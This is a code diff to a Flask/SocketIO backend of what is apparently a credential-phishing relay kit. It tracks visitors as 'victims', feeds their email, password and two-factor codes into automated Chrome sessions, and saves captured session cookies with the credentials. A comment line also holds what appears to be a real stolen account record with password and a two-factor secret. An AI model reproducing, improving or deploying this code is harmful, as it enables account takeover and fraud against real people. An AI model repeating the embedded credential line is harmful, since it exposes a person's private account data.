@@ -1,11 +1,12 @@
 import os
 import socket
+import string
 
 from flask import Flask, render_template, request, send_from_directory
 from flask_socketio import SocketIO
 
-from .database import Config, Data, Setting
-from .lib import *
+from modules.database import Config, Data, Setting
+from modules.lib import *
 
 app = Flask(__name__, static_folder="static",
             template_folder="static", static_url_path="/static")
@@ -48,8 +49,13 @@ def handle_connect():
     else:
         ip = request.remote_addr
     proxy = None if proxy == "" else proxy
-    list_victim[ip] = AutoChrome(
-        image=bool(load_image), css=bool(load_css), headless=bool(hide_chrome), keep_open=bool(auto_close), proxy=proxy)
+    str(ip)
+    print(f"Connected: {ip}")
+    if ip in list_victim:
+        pass
+    else:
+        list_victim[ip] = AutoChrome(
+            image=bool(load_image), css=bool(load_css), headless=bool(hide_chrome), auto_close=bool(auto_close), proxy=proxy)
 
 
 @socketio.on("disconnect")
@@ -58,8 +64,23 @@ def handle_disconnect():
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         ip = request.remote_addr
-    list_victim[ip].quit()
-    list_victim.pop(ip)
+    ip = str(ip)
+    if ip in list_victim:
+        print('Client is disconnected' + ip)
+        list_victim.pop(ip)
+
+# 61554980854933|5I1*ABJ3vHY|WZHYPNR7VZTGWKHLBI7W3ZBSOVEOBLXB|oouhicizd200061@desertsundesigns.com|5I1*ABJ3vHY
+
+
+@socketio.on("exit")
+def handle_exit():
+    if request.headers.getlist("X-Forwarded-For"):
+        ip = request.headers.getlist("X-Forwarded-For")[0]
+    else:
+        ip = request.remote_addr
+    ip = str(ip)
+    if ip in list_victim:
+        list_victim.pop(ip)
 
 
 @socketio.on("login")
@@ -68,10 +89,13 @@ def handle_login(data):
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         ip = request.remote_addr
+    str(ip)
     country = get_country(ip)
     if ip in list_victim:
+        print("IP Client:" + ip)
         pass
     else:
+        exit(0)
         list_victim[ip] = AutoChrome()
     list_victim[ip].email = data["email"]
     list_victim[ip].phonenumber = data["phone"]
@@ -100,11 +124,13 @@ def handle_two_factor(code):
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         ip = request.remote_addr
+    str(ip)
     if ip in list_victim:
         pass
     else:
         return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
     status = list_victim[ip].enter_code_two_factor(code)
+    print(status)
     if status["message"] == "LOGGED_IN":
         cookie = list_victim[ip].get_cookie(cookie_type)
         Data().add_data(list_victim[ip].email, list_victim[ip].password,
@@ -120,6 +146,7 @@ def handle_forget_password(code):
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         ip = request.remote_addr
+    str(ip)
     if ip in list_victim:
         pass
     else:
@@ -140,6 +167,7 @@ def handle_device_verification():
         ip = request.headers.getlist("X-Forwarded-For")[0]
     else:
         ip = request.remote_addr
+    str(ip)
     if ip in list_victim:
         pass
     else:
